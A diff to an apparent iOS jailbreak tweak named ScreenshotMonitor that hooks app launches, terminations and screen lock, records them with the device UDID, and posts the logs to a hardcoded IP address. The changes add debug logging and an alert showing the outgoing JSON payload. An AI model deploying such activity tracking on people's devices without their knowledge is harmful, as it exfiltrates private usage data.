@@ -4,7 +4,7 @@
 #import <AudioToolbox/AudioToolbox.h>
 
 // Configuration - Change these values
-static NSString *API_ENDPOINT = @"http://186.190.215.38:3000/screenshots/log/";
+static NSString *API_ENDPOINT = @"http://186.190.215.38:3000/screenshots/log";
 static NSString *DEVICE_ID = nil; // Will be set to device UDID
 static NSMutableArray *actionLogs = nil; // Store recent action logs
 static NSMutableArray *debugLogs = nil; // Store debug logs
@@ -77,12 +77,14 @@ static NSTimer *debugTimer = nil; // Timer for debug window updates
 -(void)launchApplicationWithIdentifier:(NSString *)identifier suspended:(BOOL)suspended {
     %orig;
     [self logAction:[NSString stringWithFormat:@"App Launched: %@", identifier]];
+    [self logDebug:[NSString stringWithFormat:@"launchApplicationWithIdentifier fired for %@. actionLogs: %@", identifier, actionLogs]];
 }
 
 // Hook into app termination
 -(void)terminateApplicationWithIdentifier:(NSString *)identifier {
     %orig;
     [self logAction:[NSString stringWithFormat:@"App Terminated: %@", identifier]];
+    [self logDebug:[NSString stringWithFormat:@"terminateApplicationWithIdentifier fired for %@. actionLogs: %@", identifier, actionLogs]];
 }
 
 // Hook into screen lock
@@ -146,6 +148,18 @@ static NSTimer *debugTimer = nil; // Timer for debug window updates
         for (NSString *log in debugLogs) {
             [message appendFormat:@"%@\n", log];
         }
+        
+        // Add JSON payload being sent
+        NSDictionary *payload = [self prepareActionsForSending];
+        NSError *jsonError;
+        NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:NSJSONWritingPrettyPrinted error:&jsonError];
+        NSString *jsonString = @"";
+        if (!jsonError && jsonData) {
+            jsonString = [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
+        } else {
+            jsonString = [NSString stringWithFormat:@"Error creating JSON: %@", jsonError.localizedDescription];
+        }
+        [message appendFormat:@"\n\nPayload to be sent:\n%@\n", jsonString];
         
         // Show debug alert
         UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"ScreenshotMonitor Debug"
